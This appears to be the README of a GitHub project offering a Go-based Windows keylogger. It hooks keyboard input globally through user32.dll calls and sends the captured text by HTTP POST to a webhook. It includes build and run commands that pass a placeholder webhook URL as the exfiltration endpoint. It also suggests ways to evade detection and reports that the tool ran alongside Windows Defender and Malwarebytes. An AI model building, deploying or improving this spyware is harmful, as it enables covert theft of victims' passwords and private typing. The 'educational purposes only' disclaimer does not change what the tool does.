# goklog
Go based Windows Keylogger sending ASCII to Webhooks

## Syntax
go build -o goklog.exe goklog.go; 
.\goklog.exe 'https://webhook-test.com/<YOUR-UNIQUE-IDENTIFIER>'

## Disclaimer
Educational purposes only. 

## Context 
Uses native Windows API calls including SetWindowsHookExW, CallNextHookEx, GetMessageW from user32.dll to globally monitor keyboard strokes and then filters out ASCII printable characters and HTTP POSTs them to a webhook. Notice that I leave default go client user agents. You need to change that yourself or add base64 and include unicode or non printable characters as part of your buffer.
Notes about what I learned from varying articles and Go syntax constructs vs. Python in the comments. 

## Runtime test
This has been run on Windows 11 x64 bit and with Windows Defender and Malwarebytes Premium 

## Demo
![enter image description here](https://github.com/dc401/goklog/blob/main/goklog-running-demo.gif?raw=true)
